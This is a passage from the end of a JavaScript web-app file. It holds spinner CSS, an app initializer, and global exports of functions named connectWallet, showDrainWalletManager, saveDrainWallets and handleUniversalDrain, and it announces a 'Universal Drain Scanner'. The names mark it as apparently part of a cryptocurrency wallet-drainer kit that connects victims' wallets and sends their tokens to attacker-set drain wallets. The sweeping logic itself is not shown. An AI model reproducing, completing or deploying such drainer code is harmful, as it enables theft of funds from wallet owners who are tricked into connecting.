            border-top: 4px solid #4f46e5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        .no-tokens {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.id = styleId;
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// ================================================
// INITIALIZE APP
// ================================================

window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.connectWallet = connectWallet;
window.closeModal = closeModal;
window.showDrainWalletManager = showDrainWalletManager;
window.saveDrainWallets = saveDrainWallets;
window.handleUniversalDrain = handleUniversalDrain;

console.log('✅ Universal Drain Scanner Loaded');
